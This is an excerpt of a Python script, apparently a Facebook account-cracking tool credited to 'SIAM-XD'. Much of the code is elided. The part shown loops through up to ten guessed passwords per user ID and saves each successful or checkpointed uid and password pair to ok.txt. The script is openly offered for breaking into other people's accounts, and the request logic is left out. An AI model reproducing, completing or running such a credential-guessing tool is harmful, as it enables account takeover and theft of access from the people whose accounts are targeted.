...
╚═════╝░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : SIAM-XD
\033[1;93m(!)\033[1;97m Github   : https://github.com/siam-00000
\033[1;93m(!)\033[1;97m Fb Id  : https://www.facebook.com/SIAM930.com
\033[1;93m(!)\033[1;97m Api Key  : TAPATAP CUDOM GA✌️
\033[1;97m--------------------------------------------------
"""
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[SIAM-XD] "+uid+" | "+pass1)
					ok = open("ok.txt","a")
					ok.write(uid+" | "+pass1+"\n")
					ok.close()
					oks.append(uid+pass1)
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[SIAM-XD✌️] "+uid+" | "+pass2)
							ok = open("ok.txt","a")
							ok.write(uid+" | "+pass2+"\n")
							ok.close()
							oks.append(uid+pass2)
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											print("\033[1;91m[SIAM-XD✌️] "+uid+" | "+pass4)
											ok = open("ok.txt","a")
											ok.write(uid+" | "+pass4+"\n")
											ok.close()
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													print("\033[1;91m[SIAM-XD] "+uid+" | "+pass5)
													ok = open("ok.txt","a")
													ok.write(uid+" | "+pass5+"\n")
													ok.close()
													oks.append(uid+pass5)
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error"]:
															print("\033[1;91m[SIAM-XD✌️] "+uid+" | "+pass6)
															ok = open("ok.txt","a")
															ok.write(uid+" | "+pass6+"\n")
															ok.close()
															oks.append(uid+pass6)
															...
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error"]:
																	print("\033[1;91m[SIAM-XD✌️] "+uid+" | "+pass7)
																	ok = open("ok.txt","a")
																	ok.write(uid+" | "+pass7+"\n")
																	ok.close()
																	oks.append(uid+pass7)
															                ...
															                q = json.loads(data)
															                if "loc" in q:
																                print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
																                ok = open("ok.txt","a")
																                ok.write(uid+" | "+pass8+"\n")
																                ok.close()
																                ...
																                if "www.facebook.com" in q["error"]:
																	                ...
																	                oks.append(uid+pass8)
															                                ...
															                                q = json.loads(data)
															                                if "loc" in q:
																                                print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
																                                ok = open("ok.txt","a")
																                                ok.write(uid+" | "+pass9+"\n")
																                                ok.close()
																                                ...
																                                if "www.facebook.com" in q["error"]:
																	                                print("\033[1;91m[SIAM-XD✌️] "+uid+" | "+pass9)
																	                                ok = open("ok.txt","a")
																	                                ok.write(uid+" | "+pass9+"\n")
																	                                ok.close()
																	                                oks.append(uid+pass9)
															                                                ...
															                                                q = json.loads(data)
															                                                if "loc" in q:
																                                                print("\033[1;92m[SIAM-XD✌️] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
																                                                ok = open("ok.txt","a")
																                                                ok.write(uid+" | "+pass10+"\n")
																                                                ok.close()
																                                                ...
																                                                if "www.facebook.com" in q["error"]:
																	                                                print("\033[1;91m[SIAM-XD✌️] "+uid+" | "+pass10)
																	                                                ok = open("ok.txt","a")
																	                                                ok.write(uid+" | "+pass10+"\n")
																	                                                ok.close()
																	                                                oks.append(uid+pass10)
